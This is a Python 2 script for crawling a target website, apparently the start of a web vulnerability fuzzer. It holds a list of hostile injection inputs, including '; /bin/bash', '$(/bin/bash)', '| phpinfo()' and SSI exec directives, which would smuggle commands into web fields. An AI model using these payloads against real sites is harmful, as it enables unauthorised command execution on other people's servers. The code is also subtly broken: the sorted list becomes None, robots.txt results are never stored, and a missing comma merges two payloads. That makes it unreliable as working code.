#!/usr/bin/python
import urllib2, urlparse, re, sys, os

if len(sys.argv) != 2:
    print "Usage:    " + sys.argv[0] + ' websiteToCrawl'
    print "Example:  " + sys.argv[0] + ' http://www.hackme.org'
    sys.exit()

#Defining Variables
errors = ['error', 'exception', 'illegal', 'invalid', 'not found', 'fail', 'xsstest', 'PHP Version']
requests = ['; phpinfo()', '; phpinfo()', '\'' 'xssFuzzTest', '`phpinfo()`', '$(phpinfo())', '| phpinfo()', '&& phpinfo()', '|| phpinfo()', '6969696969696969696969696969696969696969696969696969969696969696969696969696969696969696969696969','; /bin/bash', '; /bin/bash', '`/bin/bash`', '$(/bin/bash)', '| /bin/bash', '&& /bin/bash', '|| /bin/bash', '< !--#exec cmd="ls" -->', '< !--#exec cmd="dir" -->']

tempReg = []
toCrawl = []
crawled = []
crawling = ''

tempParsed = []
finishedURL = ''
tempParsing = []
workingURLs = []
finalParse = []

finalParsing = []
tempParse = ''
finished = ''
tempCheck = ''

tempRedir = ''
redirCheck = ''
tempRedir2 = ''

robotsTXT = ''
tempRobots = []

useOnce = 1

ftw = open('crawl-results', 'w')

baseURL = sys.argv[1]
baseParsed = urlparse.urlparse(baseURL)

linkRegex = re.compile('href=[\'|"](.*?)[\'|"].*?>', re.IGNORECASE | re.DOTALL)
robotRegex = re.compile('((?:\\/[\\w\\.\\-]+)+)', re.IGNORECASE | re.DOTALL)

print 'Crawling ' + baseURL


toCrawl.append(baseURL)

#Start the crawling
def webCrawl():
    useOnce = 1

    while 1:
        #Check if there are any other sites to crawl
        if len(toCrawl) != 0:
            tempCheck = toCrawl.pop()
            if tempCheck not in crawled:
                crawled.append(tempCheck)
                crawling = tempCheck
                print crawling
            
            else:
                continue
        #If not, break out of the function   
        else:
            break
        #View the URL and get all the links in it
        try:
            tempReg = linkRegex.findall(urllib2.urlopen(crawling).read())
        except:
            continue
        
        if useOnce == 1:
            #Take all the directories out of the robots.txt file
            for i in tempRobots:
                tempReg.append(i)
                useOnce = 0
            
        workingURLs.append(crawling)
    
        #Fix all the URLS located so that they are properly formated, then append them to be crawled
        for i in tempReg:
            if len(i) <= 1:
                continue
    
            tempParsed = urlparse.urlparse(i)
            
            if tempParsed[1] != baseParsed[1]:
                if tempParsed[1] != '':
                    continue
            
            if tempParsed[1] == baseParsed[1]:
                tempParse = i
    
                if tempParse not in toCrawl:
                    if tempParse not in crawled:
                        toCrawl.append(tempParse)
                        tempParse = ''
    
            elif i[0] == '/':
                if crawling[-1] != '/':
                    while 1:
                        crawling = crawling[:-1]
                        if crawling [-1] == '/':
                            break

            elif i[1] == '/':
                if crawling[-1] != '/':
                    while 1:
                        crawling = crawling[:-1]
                        if crawling [-1] == '/':
                            break


                finishedURL = crawling + i
                
                finishedURL = finalURLParse(finishedURL)
               
                if finishedURL not in crawled:
                    if finishedURL not in toCrawl:
                        toCrawl.append(finishedURL)
    
            finishedURL = ''

def robots():
    #Checks if there's a robot.txt file, if there is, get the directories from there.
    try:
        robotsTXT = urllib2.urlopen(baseURL + 'robots.txt').read()
        tempRobots = robotRegex.findall(robotsTXT)
        print 'robots.txt contains:'
        for i in tempRobots:
            print i
        print '-------------------------------------------------------'
    except:
        print 'No Robots.txt file.'

def finalURLParse(url):
    finishedURL = ''
    finalParse = url

    finalParse = urlparse.urlparse(url)
    finalParse =  urlparse.ParseResult(scheme = finalParse.scheme, netloc = finalParse.netloc, path = os.path.abspath(finalParse.path), params = finalParse.params, query = finalParse.query, fragment = finalParse.fragment) 
    finishedURL = finalParse.geturl()
    return finishedURL

robots()
webCrawl()


if len(workingURLs) != 0:
    print len(workingURLs)
    workingURLs = workingURLs.sort()
    for i in workingURLs:
        ftw.write(i)
    
print 'Crawling complete!'
ftw.close()
